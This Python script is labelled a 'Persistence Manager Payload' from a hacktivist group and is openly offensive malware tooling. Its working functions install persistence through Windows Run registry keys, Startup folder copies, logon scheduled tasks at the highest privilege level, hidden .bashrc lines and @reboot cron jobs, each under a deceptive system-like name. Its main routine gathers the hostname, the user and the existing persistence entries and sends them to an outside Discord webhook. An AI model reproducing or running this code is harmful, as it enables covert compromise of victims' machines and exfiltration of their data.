#!/usr/bin/env python3
"""
Persistence Manager Payload
Establishes multiple persistence mechanisms on Windows systems
⚡ EchoDead - Hacktivist Collective
"""

import os
import sys
import platform
import subprocess
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

class PersistenceManager:
    """Manage various persistence techniques"""
    
    def __init__(self):
        self.results = {}
        self.platform = platform.system()
    
    def registry_run_key(self, payload_path, name="SystemUpdate"):
        """Add to Windows Registry Run key (HKCU)"""
        if self.platform != "Windows":
            return False, "Not Windows"
        
        try:
            key_path = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
            cmd = f'reg add "{key_path}" /v "{name}" /t REG_SZ /d "{payload_path}" /f'
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                return True, f"Registry key added: {name}"
            else:
                return False, f"Failed: {result.stderr}"
        except Exception as e:
            return False, str(e)
    
    def startup_folder(self, payload_path, name="system_service.exe"):
        """Copy to Windows Startup folder"""
        if self.platform != "Windows":
            return False, "Not Windows"
        
        try:
            startup_path = os.path.join(
                os.getenv('APPDATA'),
                r'Microsoft\Windows\Start Menu\Programs\Startup'
            )
            
            if not os.path.exists(startup_path):
                return False, "Startup folder not found"
            
            target = os.path.join(startup_path, name)
            
            # Create symbolic link or copy
            if os.path.exists(payload_path):
                import shutil
                shutil.copy2(payload_path, target)
                return True, f"Copied to: {target}"
            else:
                return False, f"Source file not found: {payload_path}"
        except Exception as e:
            return False, str(e)
    
    def scheduled_task(self, payload_path, task_name="SystemMaintenance"):
        """Create Windows Scheduled Task"""
        if self.platform != "Windows":
            return False, "Not Windows"
        
        try:
            # Create task that runs at logon
            cmd = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc onlogon /rl highest /f'
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                return True, f"Scheduled task created: {task_name}"
            else:
                return False, f"Failed: {result.stderr}"
        except Exception as e:
            return False, str(e)
    
    def wmi_event_subscription(self, payload_path):
        """WMI Event Subscription (Advanced)"""
        if self.platform != "Windows":
            return False, "Not Windows"
        
        try:
            # This is a placeholder - actual WMI persistence is complex
            # Would require creating EventFilter, EventConsumer, and FilterToConsumerBinding
            return False, "WMI persistence not implemented (requires admin)"
        except Exception as e:
            return False, str(e)
    
    def bashrc_persistence(self, command):
        """Add to .bashrc (Linux/macOS)"""
        if self.platform == "Windows":
            return False, "Not Linux/macOS"
        
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            
            # Check if already present
            if os.path.exists(bashrc):
                with open(bashrc, 'r') as f:
                    if command in f.read():
                        return True, "Already present in .bashrc"
            
            # Append command
            with open(bashrc, 'a') as f:
                f.write(f"\n# System update check\n{command}\n")
            
            return True, f"Added to {bashrc}"
        except Exception as e:
            return False, str(e)
    
    def cron_job(self, command, schedule="@reboot"):
        """Add cron job (Linux/macOS)"""
        if self.platform == "Windows":
            return False, "Not Linux/macOS"
        
        try:
            # Add to user crontab
            cron_entry = f"{schedule} {command}"
            
            result = subprocess.run(
                f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -',
                shell=True,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                return True, f"Cron job added: {schedule}"
            else:
                return False, f"Failed: {result.stderr}"
        except Exception as e:
            return False, str(e)
    
    def check_existing_persistence(self):
        """Check for existing persistence mechanisms"""
        existing = []
        
        if self.platform == "Windows":
            # Check Registry Run key
            try:
                result = subprocess.run(
                    r'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
                    shell=True,
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    existing.append(f"Registry entries: {len(result.stdout.splitlines())} keys")
            except:
                pass
            
            # Check Startup folder
            try:
                startup = os.path.join(
                    os.getenv('APPDATA'),
                    r'Microsoft\Windows\Start Menu\Programs\Startup'
                )
                if os.path.exists(startup):
                    items = os.listdir(startup)
                    existing.append(f"Startup items: {len(items)} files")
            except:
                pass
            
            # Check Scheduled Tasks
            try:
                result = subprocess.run(
                    'schtasks /query /fo LIST',
                    shell=True,
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    task_count = result.stdout.count('TaskName:')
                    existing.append(f"Scheduled tasks: {task_count} tasks")
            except:
                pass
        
        else:
            # Check .bashrc
            bashrc = os.path.expanduser("~/.bashrc")
            if os.path.exists(bashrc):
                existing.append(f".bashrc exists: {os.path.getsize(bashrc)} bytes")
            
            # Check crontab
            try:
                result = subprocess.run('crontab -l', shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    job_count = len(result.stdout.splitlines())
                    existing.append(f"Cron jobs: {job_count} entries")
            except:
                pass
        
        return existing

def main():
    print("=" * 70)
    print("PERSISTENCE MANAGER PAYLOAD")
    print("=" * 70)
    print(f"\nExecution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Platform: {platform.system()} {platform.release()}")
    
    manager = PersistenceManager()
    
    # Check existing persistence
    print("\n🔍 Checking Existing Persistence Mechanisms...")
    existing = manager.check_existing_persistence()
    
    if existing:
        print("\n📊 Found:")
        for item in existing:
            print(f"  • {item}")
    else:
        print("  ℹ️  No existing persistence detected")
    
    # Demonstrate persistence techniques (without actually installing)
    print("\n📋 Available Persistence Techniques:")
    
    techniques = {
        "Registry Run Key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Startup Folder": os.path.join(os.getenv('APPDATA', ''), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup') if platform.system() == "Windows" else "~/.config/autostart",
        "Scheduled Task": "schtasks /create (Windows) or cron (Linux)",
        ".bashrc": "~/.bashrc (Linux/macOS)",
        "Cron Job": "/etc/crontab or user crontab",
        "WMI Event Subscription": "Advanced - requires admin",
    }
    
    for name, location in techniques.items():
        available = "✅" if (platform.system() == "Windows" and "Windows" in name) or (platform.system() != "Windows" and "Linux" in name) else "⚠️"
        print(f"  {available} {name}: {location}")
    
    # Example usage (commented out for safety)
    print("\n⚠️  Example Usage (NOT EXECUTED):")
    print("  manager.registry_run_key('C:\\\\payload.exe', 'WindowsUpdate')")
    print("  manager.scheduled_task('C:\\\\payload.exe', 'SystemCheck')")
    print("  manager.bashrc_persistence('/tmp/payload.sh')")
    
    # Prepare report
    report = {
        "Platform": f"{platform.system()} {platform.release()}",
        "Hostname": platform.node(),
        "User": os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'Unknown'),
        "Existing Persistence": ", ".join(existing) if existing else "None detected",
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Status": "Reconnaissance complete",
    }
    
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    for key, value in report.items():
        print(f"{key}: {value}")
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\n📤 Sending report to Discord...")
        if send_to_discord("🔗 Persistence Manager Report", report):
            print("✅ Report sent successfully!")
        else:
            print("⚠️  Discord webhook not configured")
    else:
        print("\n⚠️  Webhook module not available")
    
    print("\n✅ Persistence reconnaissance complete!")

if __name__ == "__main__":
    main()
